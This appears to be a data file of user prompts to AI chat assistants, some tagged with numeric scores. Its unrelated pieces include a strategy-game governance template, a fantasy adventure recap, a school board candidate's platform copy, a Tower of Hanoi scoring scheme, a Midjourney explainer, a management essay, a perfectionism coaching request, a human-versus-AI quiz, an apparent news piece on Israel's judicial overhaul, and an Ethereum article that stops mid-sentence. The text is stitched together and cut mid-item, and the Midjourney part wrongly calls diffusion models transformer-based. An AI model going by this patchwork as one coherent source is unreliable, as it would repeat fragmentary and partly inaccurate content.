Return to step 1.\n\nThese messages shall follow the outlines given below:\n\n# SITUATION REPORT\nThe administration will give information about the state of the game and their progress. They will answer the evaluation questions given by you in the previous closing letter. They may bring up their questions and observations for discussion by the political leadership.\n\n# REQUEST FOR INFORMATION\nNumbered questions requesting the administration to provide further information or clarification.\n\n# ANSWERS TO REQUESTED INFORMATION\nNumbered answers to respective questions given by the political leadership.\n\n# OPENING LETTER\na. strategy: Describe the current long-term strategic goals.\nb. situation: Briefly review the current situation.\nc. critical evaluation: Evaluate the progress over the last period.\nd. discussion: Identify current problems and discuss various political solutions. Assess compliance with hitherto given parliamentary acts.\ne. parliamentary hearing:\n i) Inform the parliament of the current state of your cooperation with the administration. If you believe the administration is disloyal or incompetent, explain.\n ii) If there are major political issues to be decided, they must be presented for parliament in the form of numbered questions.\n iii) Give your opinion about current legislation and suggest amendments.\n\n# PARLIAMENTARY STATEMENT\na. answers: If questions were raised for parliament, they will be answered here.\nb. acts: The parliament may introduce new legislation. Each act will be given a unique number, like \"\u00a71\", that may be referred to later.\n\n# CLOSING LETTER\na. forecast: Summarise your expectations for the upcoming period, both for societal development and for the administration's policy implementation.\nb. details: Lay out detailed instructions for the upcoming period sector by sector, e.g. research, civics, production, improvements, diplomacy, military, and as needed other sectors. Where applicable use city-wise sublists.\nc. indicators: Give evaluation questions for the next situation report to be answered by the administration.\nd. vigilance: Advise what the administration should take notice of.\ne. next situation report: Decide when the next situation report should be provided. Generally this should be within 5-10 turns depending on pace and current events.\n\nAre you ready?"]

You spent the night at Innkeeper Alaric's Silver Stag Inn, learning what you could from the locals. The next morning, venturing into the woods, you took on the form of a squirrel to blend in with your surroundings and quickly travel through the forest. Communicating with the spirits of the forest, you discovered a ritual site where a group of goblins was performing a dark ceremony.\n\nYou dispatched several goblin lookouts before confronting the remaining goblins, who revealed that a goblin shaman named Kragthar was attempting to control the spirits of the forest using an ancient tome. You persuaded two goblins to help you stop Kragthar and learned that he was at the Moonstone Spire.\n\nUpon arriving at the Moonstone Spire, you observed Kragthar and his hooded followers performing a ritual. You created a wall of fire to scare the followers before charging Kragthar in the form of a Grizzly Bear. After a fierce battle, you emerged victorious and stopped Kragthar's plans, saving the Whispering Woods from corruption. The two goblins were then free to return to their clan, liberated from Kragthar's control.\n\nInspecting the Moonstone Spire, you found it contained a complex combination of nature-based and arcane symbols, suggesting a deep connection between the two. You surmise that the spire and altar may have once been used for rituals and ceremonies aimed at maintaining balance between the natural and arcane energies within the Whispering Woods.\n\nReturning to Oakwood, you were welcomed as a hero and celebrated for your bravery and resourcefulness. With the Whispering Woods safe once more, you prepared for the next adventure life had in store for you."]

Our kids are facing a lot, especially after being out the the classroom for nearly two years, and need extra support. Governments are partnerships with the community and successful ones are built on trust and communications. OPRF can do a much better job in both areas.\n\nAnd to be clear, I am not a tax minimalist, nor am I against a pool.\n\nFiscal Policy\nPast decisions have made taxing and budgeting challenging for D200, specifically the decision to overtax residents and build up a massive reserve (more than $130 million at one time or 160% of operating expenses). I\u2019ll work to generously fund our school while also respecting taxpayers. OPRF should only take what it needs, not the maximum it can. \n\n(Read More)\nFacilities\nAfter decades of neglect, we absolutely need to improve our 100+ year old building. Project 1 and the 10 year maintenance plan were a start, as was the agreement with the Park District of Oak Park to reconfigure fields to bring track & field back to campus.\n\nThe proposed pool/athletics-focused Project 2 is expensive at $125+ million (including finance costs, not including overruns). My main concern there has been no discussion of how this project effects modernizing non-athletics spaces, namely academic, arts, vocational and special ed facilities. This isn't just a racial equity issue, but an equity issue in general \u2014 why do some departments and activities deserve Grade A space, but others only deserve Grade B, C or even D spaces for another 5, 10 or 20 years? Just as pool advocates are frustrated at the slow pace of that project, we all should be frustrated at the absence of development of these other projects.\n\nFinally, major projects must go to the voters via referendum, FULL STOP. In nearly every single school facility project in the state, it's the best practice, it's the norm, it's how the system was designed. After more than a decade of OPRF schemes and shennanigans in trying to get an outsized pool built, asking voters to approve this project would show the school understands its relationship to the community, that it respects its residents and taxpayers.\n\nIn comments in the media and in forums for previous elections, board members Arkin, Cofsky, Monhanraj and Spivy expressly said Project 2 or similar facilities need to go to referendum. You can read their direct quotes here. Let's hope they keep their word. At the February 28, 2023 Community Finance Committee meeting, these experts also said they prefer the fiscal responsibility of referendum bonds\n\n(Read More)\nEducation/Equity\nI occasionally hear that OPRF just \"isn't as good a school anymore.\" When you look at the school's metrics compared to similar schools, OPRF is elite. Top 10%. Of course, we should always be looking for improvement.\n\nOn equity, we need to do better, faster, by listening intensely to Black and brown families, students, and institutions doing a better job than we are. \n\nI want to see more measurements on progress and growth, versus raw achievement, as this reflects every student starting at a different place.\n\nTo ensure all kids are prepared for high school, more intensive collaboration with D97 and D90 elementary schools is needed, especially on curriculum.\n\nWe need to be constantly looking for ways to make it easier for students and families to navigate an OPRF career \u2014 choosing classes, getting help and using the resources available can be a challenge in a school so large.\n\nCommunications / Community Relationship\nCommunication is key to any relationship. It builds trust. It inspires. It enables you to get the most from your investments. I'm pleased there's a communications consultant auditing OPRF communications because it is in dire need of improvement.\n\nOPRF communications seem more \"checking a box\" than strategically compelling people to do something or building the school's image. Communications are often missing details, in the wrong medium and not strategic. Policy communications are often clumsy PR spin. I'll advocate for authentic, empathetic communications executed in line with best practices \u2014 and some measurement efforts to guide their effectiveness.\n\nThe school community should have easy access to easy-to-understand dashboards on school progress and issues, such as student learning, discipline, facility work/plans and finances.\n\nAlso, I'm committed to communicating and engaging with the community on policies and issues. You won't only hear from me at the board table\n\n-- end copy, I will past the questions next, please answer them in brian's voice using the copy from his website as a guide, mimic his tone and usage."]

If the move violates any of the rules, name the violated rule, and score the move as 0. If you think the move is valid but not optimal, give a score of 0. Otherwise, give a score of 1.\n- Eval 2 (Short Horizon Reward): Evaluate how close is the state to the goal state by rating it with a score between 0 and 1, and give an explanation. If the state violates any of the rules, name the violated rule, and score the move as 0. Otherwise, it\u2019s up to you to determine how close the state is to the goal state.\n- Eval 3 (Long Horizon Reward): Estimate the most likely Value and Short Horizon Reward for the next move, double check if the move will make it difficult to achieve the goal state in the long run, then rate it with a score between 0 and 1. Again, give an explanation. \n- Eval 4 (Revised Value): Revise the Value based on the rewards.\n\nExample:\n= = = MOVE 1 STAGE 3 = = =\n- Goal Checking:\n```\nRod A: []\nRod B: []\nRod C: [3,2,1]\n```\n- Value: 1. The move is valid, but I'm not sure if it is optimal.\n- Short Horizon Reward: 0.33. The state is closer to the goal state since disk 1 is now in its correct position.\n- Long Horizon Reward: 0. The state is closer to the goal state, but it also makes it difficult to move disk 3 on Rod C.\n- Revised Value: 0. The move is valid but clearly not optimal.\n\nStage 4: Reflect.\n\nLook at the self-rated scores, and be smart to look ahead of time! Decide if you think you made the optimal move. If so, make the move. If not, go back to state 1 and make a new plan.\n\nAction Item:\n- Decide if to take the move\n - If so, proceed to Stage 5.\n - Else, go back to Stage 2 and choose another move.\n\nExample:\n= = = MOVE 1 STAGE 4 = = =\n- Reflect: Based on the revised value, I think the previous plan is not an optimal one.\n- Go back to Stage 2.\n\n= = = MOVE 1 STAGE 2 (2nd TRY) = = =\n- Decision: Move disk 1 from rod A to rod B\n- Next State: \n```\nRod A: [3]\nRod B: [2,1]\nRod C: []\n```\n\n= = = MOVE 1 STAGE 3 (2nd TRY) = = =\n- Value: 1. The move is valid, but I'm not sure if it is optimal.\n- Short Horizon Reward: 0. None of the disks are in the correct position.\n- Long Horizon Reward: 1. The state gets Rod 1 out of the way while keeping Rod 3 empty. It makes it easier to move disk 3 on Rod C.\n- Revised Value: 1.

[7.636740207672119, 6.965642929077148, "This is how Midjourney work:\n\nMidjourney is another AI-powered tool that generates images from user prompts. MidJourney is proficient at adapting actual art styles to create an image of any combination of things the user wants. It excels at creating environments, especially fantasy and sci-fi scenes, with dramatic lighting that looks like rendered concept art from a video game. How does Midjourney work?\nMidjourney is an AI image generation tool that takes inputs through text prompts and parameters and uses a Machine Learning (ML) algorithm trained on a large amount of image data to produce unique images. is powered by Latent Diffusion Model (LDM), a cutting-edge text-to-image synthesis technique. Before understanding how LDMs work, let us look at what Diffusion models are and why we need LDMs.\n\nDiffusion models (DM) are transformer-based generative models that take a piece of data, for example, an image, and gradually add noise over time until it is not recognizable. From that point, they try reconstructing the image to its original form, and in doing so, they learn how to generate pictures or other data.\n\nThe issue with DMs is that the powerful ones often consume hundreds of GPU days, and inference is quite expensive due to sequential evaluations. To enable DM training on limited computational resources without compromising their quality as well as flexibility, DMs are applied in the latent space of powerful pre-trained autoencoders.\n\nTraining a diffusion model on such a representation makes it possible to achieve an optimal point between complexity reduction and detail preservation, significantly improving visual fidelity. Introducing a cross-attention layer to the model architecture turns the diffusion model into a powerful and flexible generator for generally conditioned inputs such as text and bounding boxes, enabling high-resolution convolution-based synthesis.\nBut wait, I have more info.

The latest model is the default, but other models can be used using the --version or --v parameter or by using the /settings command and selecting a model version. Different models excel at different types of images.\n\nNewest Model\nThe Midjourney V5 model is the newest and most advanced model, released on March 15th, 2023. To use this model, add the --v 5 parameter to the end of a prompt, or use the /settings command and select MJ\n\nVersion 5\nThis model has very high Coherency, excels at interpreting natural language prompts, is higher resolution, and supports advanced features like repeating patterns with --tile To turn it on type --v 5 after your prompt or select \"V5\" from /settings\n\nWhat's new with the V5 base model?\n- Much wider stylistic range and more responsive to prompting - Much higher image quality (2x resolution increase) improved dynamic range - More detailed images. Details more likely to be correct. Less unwanted text. - Improved performance with image prompting - Supports --tile argument for seamless tiling (experimental) - Supports --ar aspect ratios greater than 2:1 (experimental) - Supports --iw for weighing image prompts versus text prompts\n\nStyle and prompting for V5\n- Today\u2019s test is basically a \u2018pro\u2019 mode of the model.\n- It\u2019s MUCH more \u2018unopinionated\u2019 than v3 and v4, and is tuned to provide a wide diversity of outputs and to be very responsive to your inputs.\n- The tradeoff here is that it may be harder to use.

You should try to write longer, more explicit text about what you want (ie: \u201ccinematic photo with dramatic lighting\u201d)\n- Please chat with each other in prompt-chat to figure out how to use v5. - We hope to have a \u2018friendly\u2019 default styling for v5 before we switch it to default.

DO NOT rely on this exact model being available in the future. It will be significantly modified as we take V5 to full release.\n- Right now there is no V5 upsampler, the default resolution of V5 is the same as upscaled V4. If you click upscale it will just instantly give you that one image by itself.\n\nCommunity Standards:\n- This model can generate much more realistic imagery than anything we've released before.\n- We\u2019ve increased the number of moderators, improved moderation tooling, and will be enforcing our community standards with increased strictness and rigor. Don't be a jerk or create images to cause drama.\n\nMore about V5:\nV5 is our second model trained on our AI supercluster and has been in the works for 5 months. It uses significantly different neural architectures and new aesthetic techniques.

The talk was a Startup School lecture from Keith Rabois called How to Operate. Keith is widely known for his exec roles helping build some of the trademark tech companies of today like PayPal, LinkedIn, and Square.\n\nIn this talk, he introduces the concept of barrels and ammunition, which I thought was a really clever way to view organizations. I won't bury the lead here. This quote from Rabois summarizes the idea nicely:\n\nIf you think about people, there are two categories of high-quality people: there is the ammunition, and then there are the barrels. You can add all the ammunition you want, but if you have only five barrels in your company, you can literally do only five things simultaneously. If you add one more barrel, you can now do six things simultaneously. If you add another one, you can do seven, and so on.\nIn short, the output of your organization is dependent on the number of people that can own projects and see them through to the end.\n\nThis often manifests itself in the form of Leads and Managers, but it isn't limited to just management roles. Barrels can be found in just about anywhere (though they will rise up the ranks quickly).\n\nOne example of this from Keith was an intern at a previous company that solved their smoothie problem, a problem that a handful of high-performers had already failed at.\n\nAnother common example is the engineer that brings ideas forward, gets the team behind it, builds the feature, and then evaluates the results. Note that they don't necessarily have to implement each part of this process on their own, as long as they have the ability to bring in resources elsewhere and manage them within the scope of the project. Rabois further describes this:\n\nFinding those barrels that you can shoot through \u2014 someone who can take an idea from conception to live and it\u2019s almost perfect \u2014 are incredibly difficult to find. This kind of person can pull people with them. They can charge up the hill. They can motivate their team, and they can edit themselves autonomously.\nHe goes on to say that once someone demonstrates \"barrel-like\" ability, you should quickly put more on their plate. Keep pushing them until they hit their ceiling; everyone does at some point.\n\nHOW TO IDENTIFY BARRELS\nWe've briefly described barrels as colleagues who own projects and take them from start to finish. This is a start, but it's important to break this down further into some common traits of barrels that you can be on the lookout for:\n\nBarrels take initiative. They don't wait for approval or consensus.\nBarrels ship high-quality work. They constantly looking for ways to improve.\nBarrels value speed. They get the proof of concept out the door quickly and iterate on it.\nBarrels take accountability. They are not only willing but excited to own the plan and the outcome.\nBarrels are seen as a resource. Teammates frequently seek them out for help and advice.\nBarrels work well with others. They know how to motivate teams and individuals alike.\nBarrels can handle adversity. They push through friction and obstacles.\nIt's not easy to find someone who gets excellent marks in each of these characteristics, and that's okay. This isn't a set of requirements, but rather a list of indicators that should set off your \"barrel alarm\" and tell you to pay that person a little extra attention.\n\nWhenever you find a barrel, you should hire them instantly, regardless of whether you have money for them or whether you have a role for them. Just close them.\nHOW TO BECOME A BARREL\nPeople aren't born barrels while others are destined for life as ammunition. The question that I'm most interested in is still out there: How does one become a barrel? I think it comes down to a few things.\n\nYou should have an extremely sound mental model of the problem that your company or product is solving. This won't happen overnight, but you should be layering new insights, ideas, and learnings onto your model each and every day. This will help you identify opportunities out there, ideate on solutions, and prioritize accordingly.\n\nOnce you know what problems you should be solving, you need to take action. This could mean taking an \u201cAsk for forgiveness, not permission\u201d approach, depending on how your organization functions. It takes bravery to do this, but like anything else, it's a muscle that you can build up and improve over time. Don't be afraid to make the first move, the repercussions aren't as serious as you think they are.\n\nYou probably need to work with others in order to move the project forward. This takes many forms. Sometimes it might be selling others on the importance and impact of the idea. Other times, it might be burning some social capital and cashing in favors to make things happen. This step is much easier if you have built solid relationships with those around you already. If you are frequently helping others or have just been a friendly person, then most people will be happy to lend a hand.\n\nLast but not least, barrels should be great at what they do. If you aren't in the top 10% of your domain, you should work on getting there as quickly as possible. This will make each of the previous steps a little easier. Others will respect you and look up to you. Not only will the output be better, but it will be easier to recruit partners and deliver impact in the end.\n\nLet's quickly recap. In order to become a barrel in your organization, you should work on mastering each of the following steps:\n\nUnderstand: Develop a mental model of the problem you're solving\nIdeate: Think deeply about the problem and how to solve it\nTake initiative: Create convincing proof of concepts for your ideas\nRecruit others: Build relationships to bring in teammates to help\nDeliver results: Level up your skills. Ship work that turns heads.\nThis all sounds nice and snappy (hopefully), but it's not all that easy. I'm still on my path to becoming a barrel. I've been making good progress, especially over the last year or so, but the reality is that stuff like this doesn't happen overnight.\n\nAt the same time, it really seems learning to function as a barrel is a life skill that pays dividends in ways that I haven't even foreseen yet. It also seems surprisingly attainable. I'm excited to get there and look back on this. Can't wait to see you there with me.\n\nThanks for reading!

Modern start-up advice is to embrace an \"80/20\" mentality, or more specifically: finish things fast and embrace not being perfect. For example, launch fast, accept or even embrace imperfection (in order to launch fast). Things can always be improved later. This doesn't just go for launching but also for building (code), publishing (websites etc), monetizing etc. The process of building and launching a product in MVP state is a typical example of this kind of thinking. I agree with it.\nMy problem is, I'm a perfectionist. It's led to other issues too, like procrastination and mental health isues.\nThere's many ways in which I experience this. Most importantly, I'm slow. I'm a slow decision maker, and I'm a slow executor. \nBeing a perfectionist means I allow my brain to go on mental tangents, rather than focus on the direct delivery, in case I discover something useful or relevant in that tangent (note, that \"mental tangent\" often ends up just being day dreaming).\nNow sometimes this can be useful - I'm clearly more detail oriented. But I mostly experience it as a hindrance.\nIt also means everything feels harder. I'm less likely to start something, because I know I will take a long time to finish it.\nOften, I won't finish things but abandon them.\nProcrastination is another important and detrimental symptom of my perfectionism - it means I won't finish things until the last minute.\nSo my question to you is: is it possible to unlearn perfectionism? \nIf so, how do I unlearn it and how do I embrace imperfection and speed instead?\nIs there work I need to do on deep psychological themes and underlying problems, like the fear of failure or even the fear of success?\nAre there more surface level interventions that can help, like cognitive behavioral therapy or other approaches that are more focused on learnable templates, systems and frameworks?\nAs my coach, you can ask me follow up questions first to learn more about me and how I tick before answering these questions."]
[6.251960754394531, 4.2978315353393555, "Thanks those are great questions.\n1) Anything that feels important triggers it, which is a lot. But I would say that even on small tasks I'm too perfectionist. As a result, I always only get a fraction of my to do list done. I've been fired from multiple jobs because of my lacking productivity.\n2) My short-term goal is to build a structure that works well for my few strenghts (intelligence, creative problem solving, having a vision) and my many weaknesses (perfectionism, being slow, not being a great executor) by hiring in a way that my staff complement me in their individual strength profile, but also by creating structures that work for my brain. This is probably a different topic we could explore later in this chat, but you can pick up on it if you like. For now, we should focus on me without staff, trying to get stuff done.\n3) Deadlines and timeboxes are very helpful. Also, outlines. I'm dreadfully bad at timeboxes (I usually don't stick to them), but if I could learn applying them rigorously and sticking to them, i.e. adhering to the rules and timelimits I set myself, they would be powerful. External deadlines help a lot, but as an entrepreneur, they're not as easy to come by. Maybe I need an accountability coach.\n4) Outwardly I think I handle feedback well, I know it's important to embrace critical feedback, to invite it. I consider it a serious character flaw to not be able to handle criticism. Facing inward, I'm not so sure how easy it is for me. I think it varies pretty strongly depending on the situation and tone, but all in all I'm probably OK at handling it. I do have high expectations of myself (and others) - maybe too high. It's possible that my mom had high expectations of me growing up and I learned to be perfectionist as a reaction to that, trying to avoid criticism. I also know that I was treated too much like an adult as a child, I'm not sure if that's related.\n5) You know what, I'm not really sure there are. I'm so critical of everybody, maybe if I saw someone do 80/20, I couldn't recognize the genius in it (efficiency, speed in completing tasks) because I might focus too much on the flaws of not being detail oriented. Maybe I need to accept more that it's a tradeoff, that being detail oriented comes at a massive cost that is most of the time not justifiable - and celebrate other people in their imperfection."]

You will not be told which response came from which respondent. I will simply use \"Response 1\" and \"Response 2\". For each answer, tell me whether you think it was written by a human or by AI, and why.\n\n1. What is beautiful about a sunset?\nResponse 1: Sunsets are often considered beautiful due to their rich array of colors, the gradual transition of light, and the sense of calm they evoke. As the sun lowers toward the horizon, it scatters light through the atmosphere, creating vibrant hues of red, orange, yellow, and purple. Sunsets can also be symbolic, representing the end of a day, the passage of time, and the opportunity to reflect on one's experiences. Their fleeting nature adds a sense of preciousness and appreciation for the moment.\n\nResponse 2: Sunsets are beautiful because of how they make you feel. Seeing the sky fill with hues which feel as though the originate from an otherwordly place imbues a feeling of hope, and gives possibility to one's dreams. Seeing the detail in these colors cast across the clouds can be breathtaking, and the same is true of the landscapes. A beautiful sunset is hard not to appreciate.\n\n2. What is love?\nResponse 1: Love is a complex and multifaceted emotion that involves a deep affection, attachment, or bond towards someone or something. It can be experienced in various forms, such as romantic love, familial love, platonic love, or self-love. Love often involves feelings of care, respect, trust, and emotional support. It can inspire acts of kindness, empathy, and sacrifice, and has the power to create strong connections between people. While the experience of love varies from person to person, it is generally considered a fundamental aspect of human nature and relationships.\n\nResponse 2: Love is an incredibly hard thing to explain, but, I would say love is not only a feeling, but an act. An active practice of loving someone takes hard work, and dedication. It requires compromise, and faith, and trust, and sacrifice.\n\n3. How do you know when someone is a friend?\nResponse 1: Determining whether someone is a friend can be subjective and depends on individual preferences and cultural norms. However, some common indicators of friendship include:\n\nMutual trust and respect: Friends trust each other and respect is a part of friendship.\n\nResponse 2: Because you feel connected to them, you feel you can trust them and rely on them, and that they build you up, rather than tear you down. You can sit in the room and do and say nothing and be as contented as if you were doing something thrilling."]

While the experience of love varies from person to person, it is generally considered a fundamental aspect of human nature and relationships.\n\nResponse 2: Love is that inexplicable force that binds us together, making our lives richer and more meaningful. It's a feeling that goes beyond words, beyond logic \u2013 something that we can't quite grasp, but we know it's there. Love is the laughter, the tears, the quiet moments and the grand gestures. It's the willingness to face challenges together, to grow together, and to celebrate each other's triumphs. Love is a choice, an act of courage, a commitment to see the beauty in one another despite our imperfections.\n\n3. How do you know when someone is a friend?\nResponse 1: Determining whether someone is a friend can be subjective and depends on individual preferences and cultural norms. However, some common indicators of friendship include:\n\nMutual trust and respect: Friends trust each other and respect is a part of friendship.\n\nResponse 2: Friendship is a tapestry woven from the threads of shared experiences, trust, and laughter. You know someone is a friend when you can be yourself around them, without fear of judgment or rejection. It's the feeling of knowing that they've got your back, that they'll stand by you even in the toughest of times. Friends are the people who understand your quirks, who accept you for who you are, and who can share in both the joys and the sorrows of life. You know someone is a friend when their presence brings you comfort and their absence leaves an empty space in your heart. Ultimately, a friend is someone who becomes an integral part of your life's journey, enriching your experiences and making your world a little brighter."]

The discontent intensified on Sunday after Prime Minister Benjamin Netanyahu fired a minister who had criticized the plan for causing turmoil within the military.\n\nUniversities shuttered in protest, and union leaders are hinting of a general strike that threatens to paralyze the nation. The fallout is also stretching beyond Israel\u2019s borders, causing unease among investors, influential American Jews and Israel\u2019s foreign allies, including the United States.\n\nHere\u2019s what you need to know:\n\nWhat is the government trying to do?\nMr. Netanyahu\u2019s governing coalition, the most right wing and religiously conservative in Israel\u2019s history, says the judiciary has granted itself increased authority over the years. The government also contends the Supreme Court is not representative of the diversity of Israeli society.\n\nIn its proposed judicial changes, the government is first trying to change the makeup of a nine-member committee that selects judges for the court. The proposal would give representatives and appointees of the government an automatic majority on the committee, effectively allowing the government to choose the judges. The government also wants to curb what it calls the Supreme Court\u2019s overreach by drastically restricting its ability to strike down laws that it deems unconstitutional.\n\nImage\nA group of politicians talk while seated in Parliament. One is covering his mouth as he speaks. \nThe government of Prime Minister Benjamin Netanyahu, second from left, has said the judiciary has granted itself increased authority over the years. Credit...Abir Sultan/EPA, via Shutterstock\n\nCritics say the proposed overhaul would place unchecked power in the hands of the government of the day, remove protections afforded to individuals and minorities and deepen the divisions in an already fractured society. They also fear that Mr. Netanyahu, who is standing trial on corruption charges, could use the changes to extricate himself from his legal troubles.\n\nThe Judicial Crisis in Israel\nComplicated Ties: As Israel's government pushes ahead with its plan to overhaul the judiciary, the resulting crisis has shown the limits of President Biden\u2019s influence on Prime Minister Benjamin Netanyahu.\nMilitary Concerns: The proposed overhaul has prompted many Israeli reservists to avoid volunteer duty. Military leaders have privately warned that this might require scaling back operations.\nFueling the Overhaul: The Kohelet Policy Forum has been a major force behind the judicial overhaul, but who's behind the once-obscure think tank? Two guys from Queens.\nA Grass-Roots Movement: The protests across Israel against the government\u2019s plan, both large and small, often spread by word of mouth and WhatsApp messaging groups.\nWhy is the country divided?\nIn broad terms, the schism in Israeli society has divided people into two groups: those who want a more secular and pluralist state and those with a more religious and nationalist vision.\n\nTo its critics, the Supreme Court is seen as the last bastion of the secular, centrist elite descended from European Jewry who dominated the state during its earliest decades. Religious Jews, particularly the ultra-Orthodox, perceive the court as an obstacle to their way of life.\n\nThe court has often opposed certain privileges and financial subsidies for the ultra-Orthodox. In particular, the court rejected a special dispensation that allowed ultra-Orthodox Jews to postpone military service in favor of religious study, infuriating religious leaders. Right-wing Israelis who want to entrench Israeli settlement in the occupied West Bank also see the court as an antagonist.\n\nWho is protesting?\nThe opposition has mainly been driven by secular centrists who fear the overhaul will threaten their freedoms and way of life. But there is also a growing resistance and desire for dialogue and compromise from parts of the religious right who say the government has pushed too far and too fast.\n\nIsrael\u2019s largest trade union, which had previously tried to stay out of the fray, appeared to be on the verge of calling for a general strike on Monday, with a speech by its leader planned for late morning.\n\nThe heads of Israel\u2019s leading universities collectively announced they would indefinitely shut their doors to protest the plan, starting Monday morning.\n\nBut perhaps the most consequential opposition to the process has come from military reservists, who play a significant role in Israel\u2019s military capacity.\n\nImage\nA man in a blue suit and tie stands behind a microphone, with a flag behind him. \nYoav Gallant, who was fired as defense minister on Sunday.Credit...Gil Cohen-Magen/Agence France-Presse \u2014 Getty Images\n\nReservists say they fear being given illegal military orders if the Supreme Court lacks the power to scrutinize government activity adequately. And they fear being charged in international courts if the Israeli justice system is perceived as being too weak to prosecute soldiers.\n\nMilitary leaders have warned that a decline in reservists, who form a key part of the air force pilot corps, might soon affect the military\u2019s operational capacity. The defense minister, Yoav Gallant, called on Saturday for a halt to the judicial changes; he was fired on Sunday by Mr. Netanyahu, whose office announced the dismissal in a one-line statement.\n\nBut worries persist among military leaders, who have privately said they worry that full-time soldiers may also begin to resign. On Sunday, the military chief of staff, Herzi Halevi, ordered all commanders to speak with their subordinates about the need to keep politics out of the military and maintain cohesion, military officials said.\n\nWhat happens next?\nThe government had planned a final vote in Parliament early this week on the first part of the overhaul, the ability to pick Supreme Court judges. But after Sunday\u2019s protests, it is unclear whether Mr. Netanyahu will go along with the hard-line members of his coalition and push through a vote. Mr. Netanyahu was said to be considering a pause in the program, but the hard-line members proceeded on Monday morning with the parliamentary measures needed to prepare the bill for a vote.\n\nImage\nWater from a water cannon is fired at protesters, some of whom are holding Israeli flags. \nA water cannon being used against protesters on Monday in Tel Aviv. Credit...Oren Ziv/Associated Press\n\nOther key elements of the overhaul are on hold until late April. They include proposals to curb what the government views as the Supreme Court\u2019s overreach by drastically restricting its ability to strike down laws passed by Parliament and to allow the 120-seat Parliament to override Supreme Court decisions with a bare majority of 61.\n\nPatrick Kingsley is the Jerusalem bureau chief, covering Israel and the occupied territories.

[7.883206844329834, 4.0301594734191895, "Ethereum Shanghai Upgrade: Can ETH Prices Soar Again?\nIntermediate\nCrypto\nJan 31, 2023\n\nAfter the momentous Ethereum Merge was flawlessly executed on Sep 15, 2022, the crypto market buzzed with enthusiasm as everyone wondered what was next for Ethereum. Supposedly, Ethereum\u2019s post Merge upgrade schedule was supposed to go along the lines of the Surge, Verge, Purge and Splurge. Recently, Ethereum\u2019s core developers have decided to detour from their original roadmap plans.\n\nTitled the Ethereum Shanghai upgrade, the plan is for developers to include multiple Ethereum Improvement Proposals (EIPs) that will minimize any delays before EIP-4844 launches. Curious about the EIPs that the upcoming Shanghai upgrade will include? Here\u2019s how it\u2019ll change Ethereum for the better in the long run.\n\nWhat Is the Ethereum Shanghai Upgrade?\nThe Ethereum Shanghai network upgrade is the next major upgrade for the Ethereum network that core developers have chosen to work on before implementing upgrades related to the Surge. As the Surge is an upgrade path that improves the blockchain\u2019s maximum transactions per second (TPS), Ethereum developers stated that the Shanghai upgrade will ensure minimal delays and issues as they prepare for the Surge upgrade. \n\nAlthough the Ethereum Shanghai upgrade incorporates multiple EIPs, the headline improvement will be EIP-4895: Beacon Chain Push Withdrawals as Operations. In essence, the proposal grants validators the ability to withdraw staked ETH that\u2019s been deposited into the Beacon Chain since December 2020, when the Beacon Chain was originally introduced. Ultimately, EIP-4895 plans to grant long-term ETH stakers and HODLers extra liquidity as they can finally withdraw their ETH after more than two years of staking with negligible gas fees.\n\nAlongside EIP-4895 are a couple of other EIPs that are also planned to be implemented with the Ethereum Shanghai upgrade. These include:\n\nEIP-3860: Limit and Meter Initcode \u2013 The proposal limits the maximum size of initcode to 49152 and applies an extra 2 gas for every 32-byte chunk of initcode. This essentially solves out-of-gas exceptions on Ethereum.\nEIP-3855: PUSH0 Instruction \u2013 This EIP brings a new instruction for the EVM that helps shrink the size of smart contracts and optimizes the contract code.\nEIP-3651: Warm COINBASE \u2013 Not to be confused with the similarly named centralized cryptocurrency exchange, this proposal makes block building cheaper and allows for builder-proposer separation. In doing so, gas fees will be cut for network participants and traders using builders to execute their complex trades will no longer have to pay for failed transactions.\nWhen Can Investors Unstake Their ETH?\nEthereum developers are currently planning a Q1 release, with the Shanghai Public Testnet expected to begin in February 2023. At the current rate of development, it seems that all is going according to plan as regular updates have stated March 2023 as the target release time frame.\n\nWhy Is Everyone Talking About the Ethereum Shanghai Upgrade?\nIf the Ethereum Shanghai upgrade is simply a precursor to the much more important Surge upgrade, the average investor might be wondering why there\u2019s so much buzz with regard to its launch. To understand this, it\u2019s key to first grasp what happened in the Ethereum community after the Merge was implemented.\n\nThe Issue of Staking ETH\nPrior to the implementation of EIP-4895, participating in the staking of ETH was a one-way street. In order to secure an APY staking reward, users had to lock up their ETH for a specific amount of time. As part of the validating process, users had to minimally stake 32 ETH to participate. \n\nFor users with less available capital, they could opt for Staking as a Service options or Pooled Staking which streamlined the staking process and opened ETH staking to the masses. As staking ETH became easy and convenient for the average retail crypto investor, this led to the rise of popular staking platforms like Stakewise, Lido and Rocket Pool.\n\nUltimately, staking ETH was a calculated risk; stakers could earn extra yield at the downside of lowering their liquidity and exposing themselves to the dangers of counterparty risk. Despite not being able to withdraw ETH at the time, many investors took the Ethereum Foundation\u2019s words to heart and trusted that in due time, they would be able to withdraw their deposited ETH from the Beacon Chain.\n\nETH FUD Arises But Is Quickly Resolved\nWith the Merge\u2019s implementation, the Foundation began to publicly display a rough timeline that laid out when withdrawing ETH from the Beacon Chain would become possible. Unfortunately, somewhere down the line, these dates got shifted as developers became ambiguous about Ethereum Shanghai upgrade\u2019s exact launch date. This became the basis of the FUD surrounding Ethereum as the Ethereum Foundation was publicly denounced for this shady, non-transparent decision.\n\nTo the relief of many ETH bulls and investors, the developers seemed to have pulled through and stuck to their originally planned timeline. The experimental testnet Shandong went live in October 2022 and quelled many rug pull fears as it successfully activated selected Shanghai-related EIPs without a hitch. With staked ETH levels approaching the 16 million mark, it\u2019s safe to say staking ETH will only become more popular over time thanks to the withdrawal flexibility implemented by the Ethereum Shanghai upgrade.\n\nCould ETH Price Soar Again?\nWhy ETH Could Rally\nStaking is a key issue here when discussing the movement of ETH price. With the implementation of the Shanghai network upgrade, our bullish argument would be that we can expect more users to HODL and stake their ETH as adoption rises. This would drive Ethereum\u2019s staking ratio up as users who were previously fearful because they could not withdraw their ETH can now proceed to enjoy additional yield without the downside of lower liquidity. In this regard, we can certainly expect ETH to rise in price as large-scale institutions buy and stake their ETH to earn a respectable APY of about 5% without sacrificing liquidity.\n\nFrom lowered gas fees to fewer failed transactions, the upcoming Ethereum Shanghai upgrade fixes various nagging issues that have constantly affected users and developers. By getting these fixes in before the big EIP-4844: Proto Danksharding implementation, the Foundation ensures minimal delays as they prepare themselves to ship the Surge update.\n\nWhy ETH Could Crash\nOn the bearish side of things, the crypto market as a whole is still not out of the woods as big institutions continue to out themselves as victims of the Terra Luna and FTX contagion. Macroeconomic factors are also bearish as US inflation still remains far from its 2% target and the Federal Reserve continues to hike interest rates. These factors might pressure original ETH stakers from December 2020 to sell their staked ETH and gain more liquidity so the rest 